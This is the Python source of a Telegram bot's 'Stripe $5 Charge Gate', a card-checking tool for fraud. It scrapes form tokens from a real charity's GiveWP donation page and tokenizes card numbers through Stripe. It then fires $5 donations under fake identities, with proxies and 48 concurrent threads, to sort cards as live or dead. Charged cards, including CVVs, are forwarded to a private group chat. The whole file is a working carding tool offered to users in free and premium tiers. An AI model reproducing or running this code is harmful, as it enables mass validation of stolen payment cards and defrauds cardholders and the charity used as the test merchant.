"""
Stripe $5 Charge Gate — GiveWP method
Commands: /st cc|mm|yy|cvv  |  /mst (reply to .txt or inline list)
OGGY'S PRIME BOT — @oggyproo
High-throughput: ThreadPoolExecutor (12 CPU / 96 GB Render plan)
"""

import re
import asyncio
import random
import string
import time
import io
import urllib3
from typing import Optional, Tuple, List
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()

import requests
from telegram import Update, LinkPreviewOptions
from telegram.ext import ContextTypes

from bin import get_bin_info
from database.db import (
    get_user_proxies, is_premium, log_check,
    get_bot_setting, is_gate_enabled,
)
from utils.rate_limit import rate_limit
from utils.lock_check import check_lock
from logger import get_logger
from ui.emojis import PremiumEmoji as E
from config import OWNER_USERNAME, OWNER_NAME

logger = get_logger(__name__)

# 12 CPU cores — use them all for blocking HTTP
_EXECUTOR = ThreadPoolExecutor(max_workers=48, thread_name_prefix="st_charge")

DONATE_URL = "https://ourkidsatheart.com/donate-now-austin-chapter/"
FORM_URL   = "https://ourkidsatheart.com/donate-now-austin-chapter/?payment-mode=stripe"
UA = (
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
)


# ─── Helpers ─────────────────────────────────────────────────────────────────

CARD_PATTERN = re.compile(r'(\d{13,19})[|/: ]+(\d{1,2})[|/: ]+(\d{2,4})[|/: ]+(\d{3,4})')

def parse_card(raw: str) -> Optional[Tuple[str, str, str, str]]:
    m = CARD_PATTERN.search(raw.strip())
    if not m:
        return None
    num, mo, yr, cvv = m.groups()
    if len(yr) == 4:
        yr = yr[-2:]
    return num, mo.zfill(2), yr, cvv

def luhn_ok(n: str) -> bool:
    d = [int(c) for c in n if c.isdigit()]
    if len(d) < 13:
        return False
    d.reverse()
    total = sum(
        (x * 2 - 9 if x * 2 > 9 else x * 2) if i % 2 == 1 else x
        for i, x in enumerate(d)
    )
    return total % 10 == 0

def _random_details() -> dict:
    first_names = ["Ahmed", "Mohamed", "Sarah", "Omar", "Hannah", "Yara", "Khaled", "Lina"]
    last_names  = ["Khalil", "Smith", "Williams", "Garcia", "Martinez", "Brown"]
    letters = "".join(random.choices(string.ascii_lowercase, k=20))
    digits  = f"{random.randint(0, 9999):04d}"
    return {
        "first": random.choice(first_names),
        "last":  random.choice(last_names),
        "email": f"{letters}{digits}@gmail.com",
    }

def _build_proxy(proxy_str: str) -> Optional[dict]:
    if not proxy_str:
        return None
    p = proxy_str.strip().split(":")
    try:
        url = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}" if len(p) == 4 else f"http://{p[0]}:{p[1]}"
        return {"http": url, "https": url}
    except Exception:
        return None


# ─── Blocking core (runs in thread pool) ─────────────────────────────────────

def _run_charge_sync(card_str: str, proxy_str: Optional[str]) -> dict:
    parts = card_str.strip().split("|")
    if len(parts) != 4:
        return {"Status": "Error", "Response": "Format: PAN|MM|YY|CVV"}

    number, month, year, cvv = parts
    if len(year) == 4:
        year = year[-2:]
    month = month.zfill(2)

    d = _random_details()
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA})
    proxies = _build_proxy(proxy_str)
    if proxies:
        s.proxies = proxies

    # 1. Fetch page & extract tokens
    try:
        r = s.get(DONATE_URL, timeout=20)
    except Exception as e:
        return {"Status": "Error", "Response": f"Connection error: {str(e)[:80]}"}

    html = r.text
    def grab(pat):
        m = re.search(pat, html)
        return m.group(1) if m else ""

    form_id   = grab(r'name="give-form-id" value="([^"]+)"')
    prefix    = grab(r'name="give-form-id-prefix" value="([^"]+)"')
    form_hash = grab(r'name="give-form-hash" value="([^"]+)"')
    register  = grab(r'name="give-form-user-register-hash" value="([^"]+)"')
    account   = grab(r'data-account="([^"]+)"')
    pk_live   = grab(r'data-publishable-key="([^"]+)"')
    spam_key  = grab(r'ZeroSpamDavidWalsh\s*=\s*\{[^}]*?"key"\s*:\s*"([^"]+)"')

    if not all([form_id, prefix, form_hash, register, account, pk_live]):
        return {"Status": "Error", "Response": "Failed to extract tokens from target site"}

    # 2. Stripe payment method
    guid = (
        f"{random.randint(0,0xffffffff):08x}-"
        f"{random.randint(0,0xffff):04x}-"
        f"{random.randint(0,0xffff):04x}-"
        f"{random.randint(0,0xffff):04x}-"
        f"{random.randint(0,0xffffffffffff):012x}"
    )
    pm_data = {
        "type": "card",
        "billing_details[name]":                 f"{d['first']}+{d['last']}",
        "billing_details[email]":                d["email"],
        "billing_details[address][line1]":       "New york new states 1000",
        "billing_details[address][city]":        "New york",
        "billing_details[address][state]":       "NY",
        "billing_details[address][postal_code]": "10080",
        "billing_details[address][country]":     "US",
        "card[number]": number, "card[cvc]": cvv,
        "card[exp_month]": month, "card[exp_year]": year,
        "guid": guid, "muid": guid, "sid": guid,
        "payment_user_agent": "stripe.js/148043f9d7; stripe-js-v3/148043f9d7; split-card-element",
        "referrer":     "https://ourkidsatheart.com",
        "time_on_page": "1303230",
        "key":          pk_live,
        "_stripe_account": account,
    }
    try:
        r = s.post(
            "https://api.stripe.com/v1/payment_methods", data=pm_data,
            headers={
                "Accept": "application/json",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://js.stripe.com",
                "Referer": "https://js.stripe.com/",
            }, timeout=20,
        )
        sj = r.json()
    except Exception as e:
        return {"Status": "Error", "Response": f"Stripe tokenization: {str(e)[:80]}"}

    if "id" not in sj:
        err = sj.get("error", {}).get("message", "Tokenization failed")
        return {"Status": "Declined ❌", "Response": f"Stripe: {err}"}

    pm_id = sj["id"]

    # 3. Submit donation
    donation = {
        "give-honeypot": "",
        "give-form-id-prefix": prefix, "give-form-id": form_id,
        "give-form-title": "Donate - Austin",
        "give-current-url": DONATE_URL, "give-form-url": DONATE_URL,
        "give-form-minimum": "5.00", "give-form-maximum": "999999.99",
        "give-form-hash": form_hash, "give-price-id": "custom",
        "give-recurring-logged-in-only": "", "give-logged-in-only": "1",
        "_give_is_donation_recurring": "0",
        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
        "give-amount": "5.00", "give-recurring-period-donors-choice": "day",
        "give_referral": d["first"], "give_stripe_payment_method": pm_id,
        "payment-mode": "stripe",
        "give_first": d["first"], "give_last": d["last"], "give_email": d["email"],
        "give-form-user-register-hash": register,
        "give-purchase-var": "needs-to-register",
        "card_name": d["first"], "billing_country": "US",
        "card_address": "New york new states 1000", "card_address_2": "",
        "card_city": "New york", "card_state": "NY", "card_zip": "10080",
        "give_action": "purchase", "give-gateway": "stripe",
        "71MzG": "", "zerospam_david_walsh_key": spam_key,
    }
    try:
        r = s.post(
            f"{FORM_URL}&form-id={form_id}", data=donation,
            headers={
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://ourkidsatheart.com",
                "Referer": DONATE_URL,
            }, timeout=25,
        )
    except Exception as e:
        return {"Status": "Error", "Response": f"Donation post error: {str(e)[:80]}"}

    body = r.text
    low  = body.lower()

    if "thank you for your donation" in low or "thank you" in low or "successfully" in low:
        return {"Status": "Charged ✅", "Response": "$5 donation successful — CHARGED"}
    if "requires_action" in low:
        return {"Status": "Approved 3DS ✅", "Response": "3DS required — card is live"}

    m = re.search(r"<strong>Error</strong>:\s*(.*?)</p>", body, re.S)
    if m:
        err = re.sub(r"<[^>]+>", "", m.group(1)).strip()[:200]
        el  = err.lower()
        if "insufficient" in el:
            return {"Status": "Approved CVV ✅", "Response": f"Insufficient funds — {err}"}
        if "cvv" in el or "security" in el:
            return {"Status": "Approved CCN ✅", "Response": f"CVV mismatch — {err}"}
        if "address" in el or "zip" in el:
            return {"Status": "Approved AVS ✅", "Response": f"AVS mismatch — {err}"}
        return {"Status": "Declined ❌", "Response": err}

    return {"Status": "Declined ❌", "Response": "Payment failed — no success marker"}


async def _run_charge(card_str: str, proxy_str: Optional[str]) -> dict:
    """Async wrapper — runs blocking checker in thread pool."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(_EXECUTOR, _run_charge_sync, card_str, proxy_str)


# ─── Verdict helpers ──────────────────────────────────────────────────────────

def _verdict(status: str) -> str:
    s = status.upper()
    if "CHARGED" in s:  return "CHARGED"
    if "APPROVED" in s: return "APPROVED"
    if "DECLINED" in s: return "DECLINED"
    return "ERROR"

def _emoji(v: str) -> str:
    return {"CHARGED": "💳", "APPROVED": "✅", "DECLINED": "❌", "ERROR": "⚠️"}.get(v, "⚠️")


# ─── Pvt GC forward ──────────────────────────────────────────────────────────

async def _forward_to_pvt_gc(context, cc, mo, yr, cvv, bin_info, response, username, elapsed):
    try:
        pvt_gc = get_bot_setting("pvt_gc_link")
        if not pvt_gc:
            return
        chat_target = pvt_gc.strip()
        if "t.me/" in chat_target:
            chat_target = chat_target.split("t.me/")[-1].rstrip("/")
            if not chat_target.startswith("+"):
                chat_target = "@" + chat_target
        msg = (
            f"💳 <b>CHARGED $5 — 𝑶𝑮𝑮𝒀'𝑺 𝑷𝑹𝑰𝑴𝑬 𝑩𝑶𝑻</b>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Card:</b>     <code>{cc}|{mo}|{yr}|{cvv}</code>\n"
            f"<b>BIN:</b>      <code>{bin_info}</code>\n"
            f"<b>Response:</b> <code>{response[:120]}</code>\n"
            f"<b>By:</b>       {username}\n"
            f"<b>Time:</b>     {elapsed}s\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Owner</b> ➭ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"
        )
        await context.bot.send_message(
            chat_id=chat_target, text=msg, parse_mode="HTML",
            link_preview_options=LinkPreviewOptions(is_disabled=True)
        )
    except Exception as e:
        logger.warning(f"Pvt GC forward failed: {e}")


# ─── /st — single check ───────────────────────────────────────────────────────

@check_lock
@rate_limit("stripe_charge")
async def handle_st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/st cc|mm|yy|cvv — Stripe $5 GiveWP charge"""
    if not is_gate_enabled("stripe_charge"):
        await update.message.reply_text(
            f"{E.LOCK} <b>Stripe Charge gate is disabled.</b>", parse_mode="HTML"
        )
        return

    user     = update.effective_user
    user_id  = user.id
    username = f"@{user.username}" if user.username else user.first_name

    raw_card = None
    if context.args:
        raw_card = " ".join(context.args)
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        raw_card = update.message.reply_to_message.text.strip().split("\n")[0]

    if not raw_card:
        await update.message.reply_text(
            f"{E.INFO} <b>Usage:</b> <code>/st 4242424242424242|12|26|123</code>",
            parse_mode="HTML"
        )
        return

    parsed = parse_card(raw_card)
    if not parsed:
        await update.message.reply_text(f"{E.ERROR} <b>Invalid card format.</b>", parse_mode="HTML")
        return

    cc, mo, yr, cvv = parsed
    if not luhn_ok(cc):
        await update.message.reply_text(f"{E.ERROR} <b>Card failed Luhn check.</b>", parse_mode="HTML")
        return

    proxies   = get_user_proxies(user_id)
    proxy_str = proxies[0]["proxy"] if proxies else None

    bin_data = get_bin_info(cc[:6])
    bin_info = (
        f"{bin_data.get('scheme','?').upper()} "
        f"{bin_data.get('type','?').upper()} — "
        f"{bin_data.get('bank','?')} — "
        f"{bin_data.get('country','?')}"
    ) if bin_data else "Unknown BIN"

    progress = await update.message.reply_text(
        f"💳 <b>Stripe Charge $5 — Checking...</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<code>{cc[:6]}xxxxxx{cc[-4:]}|{mo}|{yr}|{cvv}</code>\n"
        f"<i>Processing GiveWP donation flow...</i>",
        parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    t0      = time.time()
    result  = await _run_charge(f"{cc}|{mo}|{yr}|{cvv}", proxy_str)
    elapsed = round(time.time() - t0, 2)

    status   = result.get("Status", "Error")
    response = result.get("Response", "Unknown")
    verdict  = _verdict(status)
    emoji    = _emoji(verdict)

    text = (
        f"{emoji} <b>{status}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>Card</b>      ↬ <code>{cc}|{mo}|{yr}|{cvv}</code>\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>BIN</b>       ↬ <code>{bin_info}</code>\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>Amount</b>    ↬ $5.00 USD\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>Response</b>  ↬ <code>{response[:150]}</code>\n"
        f"<a href='https://t.me/{OWNER_USERNAME}'>⊀</a> <b>Time</b>      ↬ {elapsed}s\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<b>Gate</b>  ➭ Stripe Charge $5\n"
        f"<b>User</b>  ➭ {username}\n"
        f"<b>Owner</b> ➭ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"
    )

    await progress.edit_text(
        text, parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    log_check(user_id, cc, verdict, response[:200], "stripe_charge", elapsed)

    if verdict == "CHARGED":
        await _forward_to_pvt_gc(context, cc, mo, yr, cvv, bin_info, response, username, elapsed)


# ─── /mst — mass check (concurrent, 48 workers) ──────────────────────────────

@check_lock
@rate_limit("stripe_charge_mass")
async def handle_mst_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/mst — mass Stripe $5 charge, concurrent"""
    if not is_gate_enabled("stripe_charge"):
        await update.message.reply_text(
            f"{E.LOCK} <b>Stripe Charge gate is disabled.</b>", parse_mode="HTML"
        )
        return

    user     = update.effective_user
    user_id  = user.id
    prem     = is_premium(user_id)
    username = f"@{user.username}" if user.username else user.first_name

    lines: List[str] = []
    rm = update.message.reply_to_message
    if rm:
        if rm.document and rm.document.file_name.endswith(".txt"):
            f = await rm.document.get_file()
            bio = io.BytesIO()
            await f.download_to_memory(bio)
            bio.seek(0)
            lines = bio.read().decode(errors="ignore").splitlines()
        elif rm.text:
            lines = rm.text.splitlines()
    if context.args and not lines:
        lines = [" ".join(context.args)]

    if not lines:
        await update.message.reply_text(
            f"{E.INFO} <b>Usage:</b> Reply to a .txt or paste cards after /mst\n"
            f"One card per line: <code>4242...|12|26|123</code>",
            parse_mode="HTML"
        )
        return

    cards = [(parse_card(l), l) for l in lines if l.strip()]
    cards = [(p, l) for p, l in cards if p and luhn_ok(p[0])]

    limit = 500 if prem else 50
    if len(cards) > limit:
        await update.message.reply_text(
            f"{E.INFO} Limit: <b>{limit}</b> ({'Premium' if prem else 'Free'}). "
            f"Got {len(cards)}, using first {limit}.",
            parse_mode="HTML"
        )
        cards = cards[:limit]

    if not cards:
        await update.message.reply_text(f"{E.ERROR} No valid cards found.", parse_mode="HTML")
        return

    proxies   = get_user_proxies(user_id)
    proxy_str = proxies[0]["proxy"] if proxies else None

    # Semaphore: 48 concurrent (matches thread pool workers)
    SEM = asyncio.Semaphore(48)

    progress = await update.message.reply_text(
        f"💳 <b>Mass Stripe Charge $5</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<b>Total:</b> {len(cards)} cards\n"
        f"<i>Firing {min(48, len(cards))} concurrent threads...</i>",
        parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )

    totals  = {"CHARGED": 0, "APPROVED": 0, "DECLINED": 0, "ERROR": 0}
    results = {"CHARGED": [], "APPROVED": [], "DECLINED": [], "ERROR": []}
    done    = 0

    async def check_one(parsed, _raw):
        nonlocal done
        cc, mo, yr, cvv = parsed
        async with SEM:
            t0      = time.time()
            result  = await _run_charge(f"{cc}|{mo}|{yr}|{cvv}", proxy_str)
            elapsed = round(time.time() - t0, 2)

        status   = result.get("Status", "Error")
        response = result.get("Response", "Unknown")
        verdict  = _verdict(status)

        totals[verdict] += 1
        entry = f"<code>{cc}|{mo}|{yr}|{cvv}</code> — {response[:60]}"
        results[verdict].append(entry)
        log_check(user_id, cc, verdict, response[:200], "stripe_charge_mass", elapsed)

        if verdict == "CHARGED":
            bin_data = get_bin_info(cc[:6])
            bin_info = (
                f"{bin_data.get('scheme','?').upper()} — {bin_data.get('country','?')}"
            ) if bin_data else "Unknown"
            await _forward_to_pvt_gc(context, cc, mo, yr, cvv, bin_info, response, username, elapsed)

        done += 1
        if done % 10 == 0 or done == len(cards):
            try:
                await progress.edit_text(
                    f"💳 <b>Mass Stripe Charge $5</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"<b>Progress:</b> {done}/{len(cards)}\n"
                    f"💳 <b>Charged:</b>  {totals['CHARGED']}\n"
                    f"✅ <b>Approved:</b> {totals['APPROVED']}\n"
                    f"❌ <b>Declined:</b> {totals['DECLINED']}\n"
                    f"⚠️ <b>Errors:</b>   {totals['ERROR']}",
                    parse_mode="HTML",
                    link_preview_options=LinkPreviewOptions(is_disabled=True)
                )
            except Exception:
                pass

    await asyncio.gather(*[check_one(p, r) for p, r in cards], return_exceptions=True)

    summary = (
        f"💳 <b>Mass Stripe Charge $5 — Complete</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<b>Total:</b>    {len(cards)}\n"
        f"💳 <b>Charged:</b>  {totals['CHARGED']}\n"
        f"✅ <b>Approved:</b> {totals['APPROVED']}\n"
        f"❌ <b>Declined:</b> {totals['DECLINED']}\n"
        f"⚠️ <b>Errors:</b>   {totals['ERROR']}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
    )
    if results["CHARGED"]:
        summary += "💳 <b>Charged Cards:</b>\n" + "\n".join(results["CHARGED"][:20]) + "\n━━━━━━━━━━━━━━━━━━\n"
    if results["APPROVED"]:
        summary += "✅ <b>Approved:</b>\n" + "\n".join(results["APPROVED"][:10]) + "\n━━━━━━━━━━━━━━━━━━\n"

    summary += (
        f"<b>Gate</b>  ➭ Stripe Charge $5\n"
        f"<b>User</b>  ➭ {username}\n"
        f"<b>Owner</b> ➭ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a>"
    )

    await progress.edit_text(
        summary, parse_mode="HTML",
        link_preview_options=LinkPreviewOptions(is_disabled=True)
    )
